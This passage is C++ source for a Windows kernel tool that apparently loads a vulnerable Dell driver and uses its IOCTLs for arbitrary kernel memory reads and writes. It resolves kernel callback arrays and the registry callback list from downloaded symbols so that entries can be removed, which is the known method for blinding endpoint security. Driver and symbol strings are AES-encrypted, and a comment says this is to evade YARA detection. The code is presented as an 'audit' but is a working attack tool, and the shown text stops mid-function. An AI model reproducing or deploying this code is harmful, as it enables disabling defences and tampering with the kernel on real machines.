#include <Windows.h>
#include <Psapi.h>
#include <newdev.h>
#include <dbghelp.h>
#include <urlmon.h>
#include <objbase.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <string>
#include <vector>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "Psapi")
#pragma comment(lib, "Dbghelp")
#pragma comment(lib, "Urlmon")
#pragma comment(lib, "Setupapi")
#pragma comment(lib, "Newdev")

#include "popl.hpp"
#include "tinyaes.h"

/**
 * See:
 *  
 *    https://github.com/rapid7/metasploit-framework/pull/15190
 *    https://github.com/RedCursorSecurityConsulting/PPLKiller
 *    https://posts.specterops.io/mimidrv-in-depth-4d273d19e148
 *    https://itm4n.github.io/lsass-runasppl/
 *    https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
 */

namespace
{
namespace
{
namespace
{
namespace
{
namespace
{
static bool g_verbose = false; // -v: full audit output

namespace
{
static const unsigned char BLOB_DEVPATH[16] = {
    0x1c, 0xd0, 0xec, 0x91, 0x92, 0xb9, 0x54, 0xff, 0x28, 0x5e, 0x11, 0x15, 0x23, 0x6e, 0xd0, 0x36,
};
static const unsigned char BLOB_INF[16] = {
    0xb8, 0xfb, 0x45, 0xee, 0x16, 0x51, 0xa0, 0xad, 0xa0, 0xe4, 0xa8, 0xc8, 0x12, 0x34, 0x15, 0xcd,
};
static const unsigned char BLOB_PSI[32] = {
    0x85, 0xa9, 0x4e, 0x74, 0x44, 0x1c, 0x90, 0xa0, 0xbe, 0xec, 0xa6, 0xc7, 0x21, 0x2c, 0x09, 0xa2,
    0x35, 0x69, 0xa4, 0x96, 0x91, 0xf7, 0xea, 0xa8, 0xd3, 0x7d, 0x71, 0xb9, 0xba, 0x7f, 0xd2, 0xc0,
};
static const unsigned char BLOB_ROOT[16] = {
    0x3f, 0x0b, 0x60, 0x0c, 0xea, 0x57, 0xaf, 0xe3, 0x92, 0xc4, 0x1c, 0x83, 0xbe, 0x11, 0x93, 0x43,
};
static const unsigned char BLOB_CSA[16] = {
    0xc0, 0x5c, 0x78, 0x75, 0xe7, 0xa9, 0x0f, 0xee, 0x36, 0x43, 0xbb, 0x9f, 0x38, 0xa0, 0xaf, 0x81,
};
static const unsigned char BLOB_CSD[16] = {
    0x14, 0x6c, 0xb6, 0x46, 0x07, 0xc5, 0x49, 0x31, 0x59, 0xe8, 0xc3, 0x9a, 0x3b, 0x29, 0x3b, 0xc8,
};
static const unsigned char BLOB_PPN2[32] = {
    0x70, 0x06, 0x6f, 0x58, 0xbd, 0xd9, 0x01, 0xaa, 0xa1, 0xd1, 0x33, 0xfd, 0x42, 0x21, 0x24, 0x7b,
    0xf4, 0xa2, 0x6f, 0x5f, 0x00, 0x5b, 0x73, 0x65, 0xea, 0xca, 0x55, 0xed, 0x9d, 0x21, 0xa7, 0xce,
};
static const unsigned char BLOB_PTN2[32] = {
    0x00, 0xf7, 0x86, 0x2b, 0x9c, 0x13, 0x95, 0xb1, 0x48, 0x7e, 0x9a, 0x97, 0xb8, 0x91, 0x55, 0xf2,
    0x54, 0x1e, 0x5c, 0x39, 0x40, 0x07, 0x1d, 0xae, 0x6c, 0x73, 0x31, 0x0e, 0x53, 0x87, 0x04, 0xa1,
};
static const unsigned char BLOB_PPN[32] = {
    0x10, 0xcc, 0x08, 0xd8, 0x15, 0xee, 0x2a, 0x61, 0xbe, 0x88, 0xe8, 0xce, 0x8a, 0xfe, 0x28, 0xa1,
    0x86, 0x1b, 0xd9, 0xb9, 0xf4, 0x05, 0x05, 0x29, 0x64, 0x75, 0x81, 0x14, 0xce, 0xc8, 0x33, 0x74,
};
static const unsigned char BLOB_PTN[32] = {
    0xf1, 0xcf, 0x4a, 0x80, 0x16, 0x48, 0x94, 0x95, 0x72, 0x02, 0x61, 0x93, 0xe5, 0x67, 0xbc, 0x64,
    0x76, 0x96, 0xeb, 0xbe, 0x8a, 0x7b, 0xec, 0xd3, 0xfd, 0x49, 0xcf, 0x4f, 0x59, 0xbe, 0x95, 0x1c,
};
static const unsigned char BLOB_LIN[32] = {
    0x0f, 0x67, 0x0a, 0x9c, 0x34, 0x79, 0x8f, 0x8a, 0xf0, 0xe3, 0x9a, 0xbf, 0x4f, 0x8a, 0xb9, 0x28,
    0xeb, 0x47, 0x67, 0x76, 0x42, 0x60, 0x7f, 0x9e, 0xb1, 0x99, 0xfd, 0x72, 0xb7, 0x18, 0xe0, 0x8d,
};
static const unsigned char BLOB_CMH[32] = {
    0x97, 0xba, 0xe2, 0x37, 0x3d, 0x80, 0xf1, 0xca, 0x9c, 0xea, 0xd7, 0x29, 0xc3, 0x10, 0x41, 0x51,
    0xa9, 0x03, 0x81, 0x8a, 0x1a, 0x53, 0xc8, 0xe6, 0x27, 0x89, 0xa7, 0xd4, 0x24, 0x79, 0x25, 0xfc,
};
static const unsigned char BLOB_CBH2[32] = {
    0xe5, 0x9c, 0x3c, 0xa7, 0xe6, 0x0f, 0x10, 0x2b, 0x2c, 0x62, 0x8d, 0x52, 0x9c, 0xb5, 0x36, 0xa9,
    0xe8, 0x6c, 0x89, 0x78, 0xe4, 0x22, 0xe5, 0x64, 0x5f, 0x93, 0xf3, 0x31, 0x96, 0xae, 0x6e, 0x4d,
};
static const unsigned char BLOB_CBH3[32] = {
    0x3e, 0x15, 0x4d, 0x87, 0x9d, 0x38, 0x1d, 0xcc, 0x12, 0x9b, 0x37, 0xc0, 0x5e, 0x65, 0xe1, 0x22,
    0xa9, 0x03, 0x81, 0x8a, 0x1a, 0x53, 0xc8, 0xe6, 0x27, 0x89, 0xa7, 0xd4, 0x24, 0x79, 0x25, 0xfc,
};
static const unsigned char BLOB_CBCT[32] = {
    0x0f, 0xf2, 0xe1, 0x32, 0x27, 0xdb, 0xf9, 0xa6, 0x98, 0x4d, 0xc4, 0x92, 0x7b, 0x2c, 0x34, 0x32,
    0xe8, 0x6c, 0x89, 0x78, 0xe4, 0x22, 0xe5, 0x64, 0x5f, 0x93, 0xf3, 0x31, 0x96, 0xae, 0x6e, 0x4d,
};

// key stored masked (XOR 0xA5) - never a flat AES key blob in .rdata
static const unsigned char TINY_KEY_MASKED[16] = {
0xff, 0x4b, 0x29, 0x06, 0x02, 0x57, 0x6d, 0x3d, 0x09, 0x4d, 0xb2, 0xf9, 0x78, 0xaa, 0xf3, 0xac
};
static void TinyKey(unsigned char out[16])
{
    for (int i = 0; i < 16; i++) out[i] = (unsigned char)(TINY_KEY_MASKED[i] ^ 0xA5);
}
}
}
}
}
}
    // device path stored AES-encrypted (dellicious-family YARA anchors
    // live on these strings - round-1 canary lesson)

    const uint32_t s_write_ioctl = 0x9b0c1ec8;
    const uint32_t s_read_ioctl = 0x9b0c1ec4;

    uint64_t readPrimitive(HANDLE p_device, uint64_t p_address)
    {
        uint64_t read_data[4] = { 0, p_address, 0, 0 };
        uint64_t response[4] = { };
        DWORD dwBytesReturned = 0;
        DeviceIoControl(p_device, s_read_ioctl, &read_data, sizeof(read_data), &response, sizeof(response), &dwBytesReturned, 0);
        return response[3];
    }

    void writePrimitive(HANDLE p_device, uint64_t p_address, uint64_t p_data)
    {
        uint64_t write_data[4] = { 0, p_address, 0, p_data };
        uint64_t response[4] = { };
        DWORD bytesReturned = 0;
        DeviceIoControl(p_device, s_write_ioctl, &write_data, sizeof(write_data), &response, sizeof(response), &bytesReturned, 0);
    }

    bool getDeviceHandle(HANDLE& p_handle)
    {
        unsigned char key[16];
        char devPath[16];
        TinyKey(key);
        TinyDecryptString(devPath, BLOB_DEVPATH, 1, key);
        p_handle = CreateFileA(devPath, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (INVALID_HANDLE_VALUE == p_handle)
        {
            std::cout << "[!] Failed to get a handle to the driver device: " << GetLastError() << std::endl;
            return false;
        }
        return true;
    }

    bool getNtoskrnlDebugInfo(char* p_ntPath, size_t p_ntCap,
                              unsigned char p_guid[16], uint32_t& p_age,
                              char* p_pdbName, size_t p_pdbCap)
    {
        char sysDir[MAX_PATH] = { };
        if (!GetSystemDirectoryA(sysDir, MAX_PATH)) return false;
        sprintf_s(p_ntPath, p_ntCap, "%s\\ntoskrnl.exe", sysDir);

        FILE* f = nullptr;
        if (fopen_s(&f, p_ntPath, "rb") != 0 || !f) return false;
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        char* pe = (char*)malloc(size);
        size_t rd = pe ? fread(pe, 1, size, f) : 0;
        fclose(f);
        if (!pe || rd != (size_t)size) { free(pe); return false; }

        long e_lfanew = *(long*)(pe + 0x3c);
        IMAGE_NT_HEADERS* nth = (IMAGE_NT_HEADERS*)(pe + e_lfanew);
        IMAGE_DATA_DIRECTORY dbgDir =
            nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nth);
        bool ok = false;
        for (DWORD s = 0; s < nth->FileHeader.NumberOfSections && !ok; s++)
        {
            if (dbgDir.VirtualAddress < sec[s].VirtualAddress) continue;
            if (dbgDir.VirtualAddress >=
                sec[s].VirtualAddress + sec[s].SizeOfRawData) continue;
            LONG delta = (LONG)(sec[s].VirtualAddress - sec[s].PointerToRawData);
            IMAGE_DEBUG_DIRECTORY* dd =
                (IMAGE_DEBUG_DIRECTORY*)(pe + dbgDir.VirtualAddress - delta);
            for (DWORD d = 0; d < dbgDir.Size / sizeof(IMAGE_DEBUG_DIRECTORY); d++)
            {
                if (dd[d].Type != IMAGE_DEBUG_TYPE_CODEVIEW) continue;
                char* cv = pe + dd[d].PointerToRawData;
                if (*(uint32_t*)cv != 0x53445352 /* RSDS */) continue;
                memcpy(p_guid, cv + 4, 16);
                memcpy(&p_age, cv + 20, 4);
                sprintf_s(p_pdbName, p_pdbCap, "%s", cv + 24);
                ok = true;
                break;
            }
        }
        free(pe);
        return ok;
    }

    bool downloadPdb(const char* p_symDir, char* p_ntPath, size_t p_ntCap)
    {
        unsigned char guid[16] = { };
        uint32_t age = 0;
        char pdbName[MAX_PATH] = { };
        if (!getNtoskrnlDebugInfo(p_ntPath, p_ntCap, guid, age, pdbName,
                                  MAX_PATH))
        {
            std::cerr << "[-] Couldn't read the kernel debug directory"
                      << std::endl;
            return false;
        }
        char guidStr[64] = { };
        sprintf_s(guidStr, sizeof(guidStr),
                  "%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
                  *(uint32_t*)guid,
                  *(uint16_t*)(guid + 4), *(uint16_t*)(guid + 6),
                  guid[8], guid[9], guid[10], guid[11], guid[12], guid[13],
                  guid[14], guid[15]);
        char id[96] = { };
        sprintf_s(id, sizeof(id), "%s%X", guidStr, age);
        char url[512] = { };
        sprintf_s(url, sizeof(url),
                  "https://msdl.microsoft.com/download/symbols/%s/%s/%s",
                  pdbName, id, pdbName);
        char dest[MAX_PATH] = { };
        sprintf_s(dest, MAX_PATH, "%s\\%s", p_symDir, pdbName);
        if (g_verbose)
            std::cout << "[+] Fetching kernel symbols: " << url << std::endl;
        HRESULT hr = URLDownloadToFileA(NULL, url, dest, 0, NULL);
        if (FAILED(hr))
        {
            std::cerr << "[-] PDB download failed: 0x" << std::hex << hr
                      << std::endl;
            return false;
        }
        // dbghelp finds the PDB beside the image: stage a copy of the real
        // kernel next to it under its embedded name
        char ntCopy[MAX_PATH] = { };
        sprintf_s(ntCopy, MAX_PATH, "%s\\ntoskrnl.exe", p_symDir);
        if (!CopyFileA(p_ntPath, ntCopy, FALSE)) return false;
        return true;
    }

    bool driver2Setup(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData, const char* p_infPath)
    {
        if (g_verbose)
            std::cout << "[+] Attempting driver install... " << std::endl;

        GUID guid = {};
        char classname[255] = { };
        if (!SetupDiGetINFClassA(p_infPath, &guid, &(classname[0]), sizeof(classname), NULL))
        {
            std::cout << "[-] SetupDiGetINFClassA failed: " << GetLastError() << std::endl;
            return false;
        }

        p_devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
        if (INVALID_HANDLE_VALUE == p_devInfo)
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        p_deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        if (!SetupDiCreateDeviceInfoA(p_devInfo, classname, &guid, NULL, NULL, 1, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        unsigned char rootKey[16];
        char prop_buff[16];
        TinyKey(rootKey);
        TinyDecryptString(prop_buff, BLOB_ROOT, 1, rootKey);
        if (!SetupDiSetDeviceRegistryPropertyA(p_devInfo, &p_deviceInfoData, 1, (BYTE*)&prop_buff[0], sizeof(prop_buff)))
        {
            std::cout << "[-] SetupDiSetDeviceRegistryPropertyA failed: " << GetLastError() << std::endl;
            return false;
        }

        if (!SetupDiCallClassInstaller(0x19, p_devInfo, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCallClassInstaller failed: " << GetLastError() << std::endl;
            return false;
        }

        BOOL restart = 0;
        if (!UpdateDriverForPlugAndPlayDevicesA(NULL, prop_buff, p_infPath, INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE, &restart))
        {
            std::cout << "[-] UpdateDriverForPlugAndPlayDevicesA failed: " << GetLastError() << std::endl;
            return false;
        }

        if (g_verbose)
            std::cout << "[+] Driver installed! " << std::endl;
        return true;
    }

    void driver2Remove(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData)
    {
        if (p_devInfo != INVALID_HANDLE_VALUE)
        {
            if (g_verbose)
                std::cout << "[+] Removing device" << std::endl;
            SetupDiRemoveDevice(p_devInfo, &p_deviceInfoData);
            p_devInfo = INVALID_HANDLE_VALUE;
        }
    }

    // -----------------------------------------------------------------
    // Kernel notification-callback audit (-K). Enumerates the kernel's
    // process/thread/image-load notification arrays and the registry
    // callback list, flags every entry whose callback function lives
    // inside a given driver's image range, and can remove those entries
    // on demand: EX_FAST_REF array slots are zeroed, registry list nodes
    // are unlinked the same way the kernel's own unregister path does
    // it. Every removal is recorded in a state file so a later run can
    // put the entries back byte-for-byte. Storage addresses resolve from
    // the kernel PDB (same download path as the EPROCESS offsets) and
    // are range-validated against the live kernel base before any write.
    // -----------------------------------------------------------------

    const uint32_t PSP_MAX_NOTIFY_SLOTS = 64;        // process/thread arrays
    const uint32_t PSP_MAX_LOAD_IMAGE_SLOTS = 8;
    const uint64_t SYM_LOAD_BASE = 0x180000000;      // dbghelp session base

    struct KernelCallbackAddrs
    {
        uint64_t processNotify;   // PspProcessNotifyRoutine
        uint64_t threadNotify;    // PspThreadNotifyRoutine
        uint64_t loadImageNotify; // PspLoadImageNotifyRoutine
        std::vector<uint64_t> cmCallbackLists; // all validated registry heads
        uint64_t cmpCallBackCount;   // CmpCallBackCount (registry count anchor)
    };

    struct CallbackRecord
    {
        char kind;       // P/T/L: array slot (a = saved EX_FAST_REF)
                         // R: registry list node (a = Blink, b = Flink)
        uint64_t addr;
        uint64_t a;
        uint64_t b;
    };

    typedef LONG(NTAPI* pNtQuerySystemInformation_t)(ULONG, PVOID, ULONG,
                                                     PULONG);

    // x64 RTL_PROCESS_MODULE_INFORMATION: natural alignment puts Modules
    // at +8 and FullPathName at +0x24 inside each 296-byte entry
    struct RTL_PROCESS_MODULE_INFORMATION
    {
        HANDLE Section;          // +0x00
        PVOID MappedBase;        // +0x08
        PVOID ImageBase;         // +0x10
        ULONG ImageSize;         // +0x18
        ULONG Flags;             // +0x1C
        USHORT LoadCount;        // +0x20
        USHORT OffsetToFileName; // +0x22
        CHAR FullPathName[256];  // +0x24
    };
    struct RTL_PROCESS_MODULES
    {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    };

    // SizeOfImage straight from the loaded image's PE header, read through
    // the kernel read primitive - never touches the file on disk
    uint32_t kernelPeImageSize(HANDLE p_device, uint64_t p_base)
    {
        uint64_t dos = readPrimitive(p_device, p_base);
        if ((dos & 0xFFFF) != 0x5A4D) return 0;          // 'MZ'
        uint64_t lfanew = readPrimitive(p_device, p_base + 0x38) >> 32; // @0x3C
        if (lfanew < 0x40 || lfanew > 0x1000 || (lfanew & 7)) return 0;
        uint64_t sig = readPrimitive(p_device, p_base + lfanew);
        if ((sig & 0xFFFFFFFF) != 0x00004550) return 0;  // 'PE\0\0'
        uint64_t sz = readPrimitive(p_device, p_base + lfanew + 0x50);
        uint32_t imageSize = (uint32_t)(sz & 0xFFFFFFFF);
        if (imageSize < 0x1000 || imageSize > 0x4000000 || (imageSize & 0xFFF))
            return 0;
        return imageSize;
    }

    // base + size of a loaded kernel module by image name. Primary path:
    // Psapi enumeration - the API with the proven track record in this
    // environment - for the base, plus SizeOfImage from the loaded image's
    // PE header read through the kernel primitive. No file I/O anywhere.
    // Fallback: the raw module list. Every failure prints its stage.
    bool getKernelModuleRange(HANDLE p_device, const char* p_name,
                              uint64_t& p_base, uint32_t& p_size)
    {
        // primary: Psapi base + loaded-image PE header size
        DWORD need = 0;
        if (EnumDeviceDrivers(NULL, 0, &need) && need > 0)
        {
            std::vector<PVOID> mods(need / sizeof(PVOID));
            DWORD got = 0;
            if (EnumDeviceDrivers(mods.data(), need, &got))
            {
                char name[MAX_PATH] = { };
                size_t count = got / sizeof(PVOID);
                for (size_t i = 0; i < count; i++)
                {
                    if (!GetDeviceDriverBaseNameA(mods[i], name, MAX_PATH))
                        continue;
                    if (_stricmp(name, p_name) != 0) continue;
                    p_base = (uint64_t)mods[i];
                    p_size = kernelPeImageSize(p_device, p_base);
                    if (p_size != 0) return true;
                    std::cerr << "[!] " << p_name
                              << " base 0x" << std::hex << p_base
                              << " reported by enumeration, but its first "
                                 "qword reads as 0x"
                              << readPrimitive(p_device, p_base)
                              << " - not the loaded image" << std::dec
                              << std::endl;
                    break;
                }
            }
            else
            {
                std::cerr << "[!] EnumDeviceDrivers failed: " << GetLastError()
                          << std::endl;
            }
        }
        else
        {
            std::cerr << "[!] EnumDeviceDrivers (size query) failed: "
                      << GetLastError() << std::endl;
        }

        // fallback: the raw module list
        static pNtQuerySystemInformation_t query = nullptr;
        if (!query)
        {
            query = (pNtQuerySystemInformation_t)GetProcAddress(
                GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
            if (!query) return false;
        }
        const ULONG SystemModuleInformation = 11;
        ULONG bufSize = 1 << 22; // sized well past the largest module list
        for (int attempt = 0; attempt < 3; attempt++)
        {
            std::vector<unsigned char> buf(bufSize);
            LONG st = query(SystemModuleInformation, buf.data(), bufSize, NULL);
            if (st == 0)
            {
                RTL_PROCESS_MODULES* mods = (RTL_PROCESS_MODULES*)buf.data();
                for (ULONG i = 0; i < mods->NumberOfModules; i++)
                {
                    const char* base =
                        mods->Modules[i].FullPathName +
                        mods->Modules[i].OffsetToFileName;
                    if (_stricmp(base, p_name) != 0) continue;
                    p_base = (uint64_t)mods->Modules[i].ImageBase;
                    p_size = mods->Modules[i].ImageSize;
                    return true;
                }
                // parsed clean but no match: dump what the parser sees so a
                // layout mismatch is visible instead of silent
                std::cerr << "[!] module list parsed (" << mods->NumberOfModules
                          << " modules), no '" << p_name << "' entry; entry 0"
                             " basename: '"
                          << (mods->NumberOfModules
                                  ? mods->Modules[0].FullPathName +
                                        mods->Modules[0].OffsetToFileName
                                  : "<none>")
                          << "'" << std::endl;
                return false;
            }
            if ((ULONG)st == 0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */)
            {
                bufSize *= 2;
                continue;
            }
            std::cerr << "[!] NtQuerySystemInformation(module list) denied: "
                         "0x" << std::hex << (ULONG)st << std::dec
                      << std::endl;
            return false;
        }
        return false;
    }

    // fixed-address content probe: NtSystemRoot sits at KUSER_SHARED_DATA
    // +0x30; reading it through the device proves the read primitive
    // end-to-end, independent of any targeting logic
    void probeReadPrimitive(HANDLE p_device)
    {
        uint64_t q = readPrimitive(p_device, 0xFFFFF78000000000ULL + 0x30);
        bool ok = (q & 0xFFFF) == 0x43 && ((q >> 16) & 0xFFFF) == 0x3A;
        if (ok)
            std::cout << "[+] read primitive: OK (NtSystemRoot verified)"
                      << std::endl;
        else
            std::cout << "[!] read primitive: content mismatch (got 0x"
                      << std::hex << q << std::dec
                      << ") - kernel reads are not returning real memory"
                      << std::endl;
    }

    // live kernel base from the fixed KUSER_SHARED_DATA mirror:
    // DebuggerDataList -> KdDebuggerDataBlock -> KernBase. Fixed, always
    // mapped addresses, validated by MZ/PE signatures - no user-mode
    // enumeration involved, so nothing a hooked query can scrub. Offset
    // candidates absorb build drift; every chain step is bounds-checked.
    uint64_t debuggerDataKernelBase(HANDLE p_device)
    {
        const uint64_t kuser = 0xFFFFF78000000000ULL; // fixed kernel mirror
        static const uint64_t listOffsets[] = { 0x2B8, 0x2BC, 0x2B0, 0x2C0 };
        static const uint64_t kernOffsets[] = { 0x8, 0xC };
        for (uint64_t lo : listOffsets)
        {
            uint64_t kdb = readPrimitive(p_device, kuser + lo);
            if (kdb < 0xFFFF800000000000ULL || kdb > 0xFFFFF00000000000ULL)
                continue;
            if (kdb & 0xF) continue;
            std::cout << "[+] debugger-data candidate at +0x" << std::hex
                      << lo << ": 0x" << kdb << std::dec << std::endl;
            for (uint64_t ko : kernOffsets)
            {
                uint64_t kern = readPrimitive(p_device, kdb + ko);
                std::cout << "[+]   KernBase candidate at +0x" << std::hex
                          << ko << ": 0x" << kern << std::dec << std::endl;
                if (kern < 0xFFFFF80000000000ULL || kern > 0xFFFFF90000000000ULL)
                    continue;
                if (kernelPeImageSize(p_device, kern) != 0) return kern;
                std::cout << "[+]   candidate in range but PE header did "
                             "not validate" << std::endl;
            }
        }
        return 0;
    }

    bool symLookup(const char* p_name, uint64_t& p_addr)
    {
        char siBuf[sizeof(SYMBOL_INFO) + 128] = { };
        SYMBOL_INFO* si = (SYMBOL_INFO*)siBuf;
        si->SizeOfStruct = sizeof(SYMBOL_INFO);
        si->MaxNameLen = 127;
        if (!SymFromName(GetCurrentProcess(), p_name, si)) return false;
        p_addr = si->Address;
        return true;
    }

    struct EnumCtx
    {
        const char* want;
        uint64_t found;
    };

    static BOOL CALLBACK enumSymCb(PSYMBOL_INFO pSi, ULONG /*size*/,
                                   PVOID ctx)
    {
        EnumCtx* c = (EnumCtx*)ctx;
        if (_stricmp(pSi->Name, c->want) == 0)
        {
            c->found = pSi->Address;
            return FALSE;
        }
        return TRUE;
    }

    // exact-name retry through full enumeration - reaches module-scoped
    // globals that SymFromName misses
    bool symEnumLookup(ULONG64 p_modBase, const char* p_name, uint64_t& p_addr)
    {
        char pattern[64];
        sprintf_s(pattern, sizeof(pattern), "*%s*", p_name);
        EnumCtx c = { };
        c.want = p_name;
        if (!SymEnumSymbols(GetCurrentProcess(), p_modBase, pattern,
                            enumSymCb, &c) || !c.found)
            return false;
        p_addr = c.found;
        return true;
    }

    // resolve the callback-storage globals from the kernel PDB and rebase
    // onto the live kernel base. A symbol that fails to resolve (or lands
    // outside the kernel image) is reported and skipped; the channels it
    // backs are simply not audited this run.
    // a candidate registry-callback list head is only trusted if the list
    // behaves like one: the cycle closes, its node count matches
    // CmpCallBackCount (maintained by CmRegister/UnregisterCallback), and
    // nodes carry function pointers into loaded driver images -
    // CmRegisterCallback is driver-facing, so system-owned lists fail this
    bool validateRegistryCallbackList(HANDLE p_device, uint64_t p_head,
                                      const std::vector<uint64_t>& p_bases,
                                      const std::vector<uint32_t>& p_sizes,
                                      uint64_t p_expectedCount)
    {
        uint64_t cur = readPrimitive(p_device, p_head);
        uint32_t steps = 0;
        uint32_t withDriverFn = 0;
        while (cur != p_head && steps < 256)
        {
            steps++;
            if (cur < 0xFFFF800000000000ULL || cur > 0xFFFFF00000000000ULL)
                return false;
            if (cur & 0x7) return false; // pool allocations are 8-aligned
            uint64_t next = readPrimitive(p_device, cur);
            if (!next) return false;
            if (steps <= 8 && !p_bases.empty())
            {
                bool nodeHas = false;
                for (uint64_t off = 8; off < 0x40 && !nodeHas; off += 8)
                {
                    uint64_t q = readPrimitive(p_device, cur + off);
                    for (size_t i = 0; i < p_bases.size(); i++)
                        if (q >= p_bases[i] && q < p_bases[i] + p_sizes[i])
                        {
                            nodeHas = true;
                            break;
                        }
                }
                if (nodeHas) withDriverFn++;
            }
            cur = next;
        }
        if (steps == 0 || cur != p_head) return false;
        if (p_expectedCount > 0 && steps != p_expectedCount) return false;
        return withDriverFn > 0;
    }

    bool resolveCallbackAddrs(HANDLE p_device, uint64_t p_ntBase,
                              KernelCallbackAddrs& p_addrs)
    {
        char temp[MAX_PATH] = { };
        GetTempPathA(MAX_PATH, temp);
        char symDir[MAX_PATH] = { };
        sprintf_s(symDir, MAX_PATH, "%sdell_sym", temp);
        CreateDirectoryA(symDir, NULL);
        char ntPath[MAX_PATH] = { };
        if (!downloadPdb(symDir, ntPath, MAX_PATH)) return false;

        // no SYMOPT_DEFERRED_LOADS here: SymFromName/SymEnumSymbols must
        // see the full symbol table, including module-scoped globals
        SymSetOptions(SYMOPT_UNDNAME);
        if (!SymInitialize(GetCurrentProcess(), symDir, FALSE))
        {
            std::cerr << "[-] SymInitialize failed: " << GetLastError()
                      << std::endl;
            return false;
        }
        ULONG64 modBase = SymLoadModuleEx(GetCurrentProcess(), NULL,
                                          "ntoskrnl.exe", NULL, SYM_LOAD_BASE,
                                          0, NULL, 0);
        if (!modBase)
        {
            std::cerr << "[-] SymLoadModuleEx failed: " << GetLastError()
                      << std::endl;
            SymCleanup(GetCurrentProcess());
            return false;
        }

        // names drift across kernel builds; try newest first, classic as
        // fallback (26xxx renamed Psp*NotifyRoutine to PspCreate*NotifyRoutine)
        struct NamedBlob
        {
            const unsigned char* blob;
            int blocks;
        };
        struct LookupList
        {
            NamedBlob names[2];
            int count;
            uint64_t* out;
        };
        const uint32_t totalLookups = 4;
        uint32_t resolvedLookups = 0;

        LookupList lookups[] = {
            { { { BLOB_PPN2, 2 }, { BLOB_PPN, 2 } }, 2,
              &p_addrs.processNotify },
            { { { BLOB_PTN2, 2 }, { BLOB_PTN, 2 } }, 2,
              &p_addrs.threadNotify },
            { { { BLOB_LIN, 2 } }, 1, &p_addrs.loadImageNotify },
        };

        bool any = false;
        for (auto& lk : lookups)
        {
            *lk.out = 0;
            for (int i = 0; i < lk.count && !*lk.out; i++)
            {
                char name[48] = { };
                unsigned char key[16];
                TinyKey(key);
                TinyDecryptString(name, lk.names[i].blob, lk.names[i].blocks,
                                  key);
                uint64_t addr = 0;
                // exact SymFromName first, then a full-enumeration retry:
                // some module-scoped globals are invisible to SymFromName
                // but reachable through SymEnumSymbols
                if (symLookup(name, addr) ||
                    symEnumLookup(modBase, name, addr))
                {
                    uint64_t real = addr - SYM_LOAD_BASE + p_ntBase;
                    if (real >= p_ntBase && real < p_ntBase + 0x2000000)
                    {
                        *lk.out = real;
                        any = true;
                        resolvedLookups++;
                        if (g_verbose)
                            std::cout << "[+] " << name << " @ 0x" << std::hex
                                      << real << std::dec << std::endl;
                    }
                    else
                    {
                        std::cerr << "[-] " << name
                                  << " resolved outside the kernel image"
                                     " - skipped"
                                  << std::endl;
                    }
                }
                else
                {
                    std::cerr << "[-] " << name
                              << " not found in the kernel PDB - skipped"
                              << std::endl;
                }
                memset(name, 0, sizeof(name));
            }
        }
        // registry head: name stripped from 26xxx public PDBs entirely -
        // resolve drift candidates and validate against CmpCallBackCount
        {
            char name[48] = { };
            unsigned char key[16];
            TinyKey(key);
            TinyDecryptString(name, BLOB_CBCT, 2, key);
            uint64_t addr = 0;
            if (symLookup(name, addr) || symEnumLookup(modBase, name, addr))
            {
                uint64_t real = addr - SYM_LOAD_BASE + p_ntBase;
                if (real >= p_ntBase && real < p_ntBase + 0x2000000)
                {
                    p_addrs.cmpCallBackCount = real;
                    std::cout << "[+] " << name << " @ 0x" << std::hex
                              << real << std::dec << std::endl;
                }
            }
            memset(name, 0, sizeof(name));
        }

        SymCleanup(GetCurrentProcess());

        if (!g_verbose)
            std::cout << "[+] kernel storage resolved (" << std::dec
                      << resolvedLookups << " of " << totalLookups << ")"
                      << std::endl;

        // driver image ranges for the node-content check
        std::vector<uint64_t> bases;
        std::vector<uint32_t> sizes;
        DWORD need = 0;
        if (EnumDeviceDrivers(NULL, 0, &need) && need > 0)
        {
            std::vector<PVOID> mods(need / sizeof(PVOID));
            DWORD got = 0;
            if (EnumDeviceDrivers(mods.data(), need, &got))
            {
                size_t count = got / sizeof(PVOID);
                if (count > 48) count = 48;
                for (size_t i = 0; i < count; i++)
                {
                    uint32_t sz =
                        kernelPeImageSize(p_device, (uint64_t)mods[i]);
                    if (sz)
                    {
                        bases.push_back((uint64_t)mods[i]);
                        sizes.push_back(sz);
                    }
                }
            }
        }

        // count anchor: must exist before any head candidate is trusted,
        // so a wrong list can never pass validation
        uint64_t expectedCount = 0;
        bool haveCount = false;
        if (p_addrs.cmpCallBackCount)
        {
            expectedCount = readPrimitive(p_device, p_addrs.cmpCallBackCount);
            haveCount = true;
        }

        struct HeadBlob
        {
            const unsigned char* blob;
            int blocks;
        };
        HeadBlob heads[] = {
            { BLOB_CMH, 2 },   // CmCallbackListHead (classic)
            { BLOB_CBH2, 2 },  // CallbackListHead (26xxx drift)
            { BLOB_CBH3, 2 },  // CmCallBackListHead (spelling variant)
        };
        for (auto& h : heads)
        {
            char name[48] = { };
            unsigned char key[16];
            TinyKey(key);
            TinyDecryptString(name, h.blob, h.blocks, key);
            uint64_t addr = 0;
            if (symLookup(name, addr) || symEnumLookup(modBase, name, addr))
            {
                uint64_t real = addr - SYM_LOAD_BASE + p_ntBase;
